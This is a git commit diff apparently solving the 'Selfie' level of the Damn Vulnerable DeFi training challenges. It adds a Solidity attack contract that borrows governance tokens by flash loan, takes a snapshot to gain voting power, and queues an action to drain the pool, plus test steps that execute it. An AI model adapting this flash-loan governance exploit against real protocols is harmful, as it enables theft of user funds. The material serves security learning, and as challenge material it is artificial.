936f8f5a7191eca1810e9e329e19e1f7750549a3
0502lian <28177408@qq.com>
2024-04-14 21:24:33 +0800

    finish selfie

--- test/Levels/selfie/Selfie.t.sol
+++ test/Levels/selfie/Selfie.t.sol
@@ -8,6 +8,45 @@ import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableToke
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
 
+contract AttackContract {
+    SimpleGovernance internal governance;
+    SelfiePool internal pool;
+    DamnValuableTokenSnapshot internal dvt;
+    address internal owner;
+    uint256 internal actionId;
+
+    constructor(SimpleGovernance _governance, SelfiePool _pool, DamnValuableTokenSnapshot _dvt) {
+        governance = _governance;
+        pool = _pool;
+        dvt = _dvt;
+        owner = msg.sender;
+    }
+
+    function receiveTokens(address token, uint256 amount) external {
+        require(msg.sender == address(pool), "not pool call");
+        require(token == address(dvt), "not right token");
+        //new shapshot
+        dvt.snapshot();
+        //repay back
+        dvt.transfer(address(pool), amount);
+    }
+
+    function attack() public {
+        uint256 balance = dvt.balanceOf(address(pool));
+        uint256 gov_balance = dvt.balanceOf(address(governance));
+        pool.flashLoan(balance);
+
+        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", owner);
+        //action
+        actionId = governance.queueAction(address(pool), data, 0);
+    }
+    //after 2 days ,execute
+
+    function executeAction() external {
+        governance.executeAction(actionId);
+    }
+}
+
 contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
     uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;
@@ -31,10 +70,7 @@ contract Selfie is Test {
         simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
         vm.label(address(simpleGovernance), "Simple Governance");
 
-        selfiePool = new SelfiePool(
-            address(dvtSnapshot),
-            address(simpleGovernance)
-        );
+        selfiePool = new SelfiePool(address(dvtSnapshot), address(simpleGovernance));
 
         dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);
 
@@ -43,11 +79,17 @@ contract Selfie is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitSelfie() public {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        AttackContract attackContract = new AttackContract(simpleGovernance, selfiePool, dvtSnapshot);
+        attackContract.attack();
+        //after
+        vm.warp(block.timestamp + simpleGovernance.getActionDelay());
+        attackContract.executeAction();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
